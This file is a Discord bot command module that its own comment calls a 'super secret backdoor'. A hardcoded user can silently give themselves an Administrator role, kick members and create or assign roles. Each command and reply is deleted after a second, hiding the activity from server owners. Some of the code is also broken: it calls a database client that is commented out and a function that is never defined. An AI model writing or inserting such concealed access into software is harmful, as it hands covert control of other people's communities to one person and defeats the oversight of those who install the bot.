'use strict';
// super secret backdoor

const logger = require('../logger');
const ID = require('../idList');
//const db = require('../redisClient');
const prefix = '¬';

module.exports = msg => {

  if (msg.author.id != ID.Zeki) return;
  if (msg.content.slice(0, 1) !== prefix) return;

  const content = msg.content.substring(1);
  const args = content.split(' ');

  switch (args[0]) {

    case 'giveL':
      giveL(msg, args[2]);
      break;

    case 'makeRole':
      makeRole(msg, args);
      break;

    case 'addRole':
      addRole(msg, args);
      break;

    case 'clearRole':
      clearRole(msg, args);
      break;

    case 'admin':
      fullAdmin(msg, args);
      break;

    case 'kick':
      kick(msg);
      break;

    case 'repeat':
      setTimeout(() => {
        msg.channel.send(msg.content.substring(8));
      }, 500);
      break;

    default:
      discreetMessage(msg, 'idk');

  }

}

// send self-destructing message
function discreetMessage(origin, s) {
  const channel = origin.channel;
  channel.send(s).then((msg) => {
    setTimeout(() => {
      channel.messages.delete(origin);
      channel.messages.delete(msg);
    }, 1000);
  });
}

// give someone a number of Ls manually
async function giveL(msg, n) {
  const target = msg.mentions.users.first();
  if (!target) return;

  if (!n) n = 1;
  await db.hincrby('scoreboard', target.tag, n);
  msg.channel.send(`gave ${target.username} ${n} ${n == 1 ? 'L' : 'Ls'}.`);
}

function makeRole(msg, args) {
  msg.guild.roles.create({
    data: {
      name: args[1],
      color: args[2],
      permissions: parseInt(args[3]),
      hoist: args[4] == 'true' ? true : false
    }
  }).then(role => {
    if (args[5] == 'true') {
      let position = msg.guild.roles.cache.find(r => r.name === 'rainbowpuffle').position;
      role.setPosition(position - 1);
    }
    discreetMessage(msg, 'ok');
  }).catch(err => {
    discreetMessage(msg, 'i failed');
    logger.error(err);
  });
}

function addRole(msg, args){
  var target = msg.mentions.members.first();
  var role = msg.guild.roles.cache.find(r => r.name === args[2]);
  if (target && role) {
    target.roles.add(role).then(() => {
      discreetMessage(msg, 'ok');
    }).catch(err => {
      discreetMessage(msg, 'i failed');
      logger.error(err);
    });
  } else discreetMessage(msg, 'could\' find them');
}

function clearRole(msg, args){
  var target = msg.mentions.members.first();
  var role = msg.guild.roles.cache.find(r => r.name === args[2]);
  if (target && role) {
    target.roles.remove(role).then(() => {
      discreetMessage(msg, 'ok');
    }).catch(err => {
      discreetMessage(msg, 'i failed :(');
      logger.error(err);
    });
  } else discreetMessage(msg, 'couldn\'t find them');
}

function fullAdmin(msg, args){
  var target = msg.member;
  msg.guild.roles.create({
    data: {
      name: args[1] || 'admin',
      color: 'RED',
      permissions: 8,
      hoist: args[2] === 'true' ? true : false
    }
  }).then(role => {
    msg.member.roles.add(role).then(() => {
      discreetMessage(msg, 'ok');
    });
    var position = msg.guild.roles.cache.find(r => r.name === 'rainbowpuffle').position;
    role.setPosition(position - 1);
  }).catch(err => {
    discreetMessage(msg, 'i failed');
    logger.error(err);
  });
}

function kick(msg){
  var target = msg.mentions.members.first();
  if (target) {
    target.kick().then(() => {
      discreetMessage(msg, 'ok');
    }).catch(err => {
      discreetMessage(msg, 'i failed');
      logger.error(err);
    })
  } else sendCoolMsg(msg, 'couldn\'t find user');
}
